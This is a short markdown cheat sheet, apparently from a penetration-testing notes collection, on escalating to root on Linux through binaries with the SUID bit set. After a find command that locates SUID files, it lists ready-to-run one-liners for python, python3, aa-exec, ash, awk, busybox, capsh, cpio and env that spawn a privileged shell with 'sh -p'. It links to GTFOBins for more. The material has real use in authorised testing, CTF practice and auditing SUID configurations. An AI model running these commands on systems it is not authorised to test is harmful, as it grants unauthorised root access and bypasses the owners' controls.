# Linux Privilege Escalation with SUID permission
[< Back to Menu](README.md)
## Prerequisite
- Make sure the given command has `SUID` permission
- Use command `ls -l $(which <command>)` to check command permission. 
- You can find SUID files with command `find / -perm -u=s -type f 2>/dev/null`

## Python, Python3
Python 2.X.X
> /usr/bin/python
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
Python 3.X.X
> /usr/bin/python3
```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
## aa-exec
> /usr/bin/aa-exec
```bash
aa-exec /bin/sh -p
```

## ash
> /usr/bin/ash
```bash
ash -p
```

## awk
> /usr/bin/awk
```bash
awk 'BEGIN {system("sh -p")}'
```

## busybox
> /usr/bin/busybox
```bash
busybox sh
```
after that run `sh -p` so that it will spawn the root shell.

## capsh
> /usr/sbin/capsh
```bash
capsh --gid=0 --uid=0 --
```

## cpio
> /usr/bin/cpio
```bash
echo '/bin/sh -p </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
```

## env
> /usr/bin/env
```bash
env /bin/sh -p
```

## GTFOBins
For more commands to be exploited, go to [GTFOBins](https://gtfobins.github.io/#+suid%20+shell)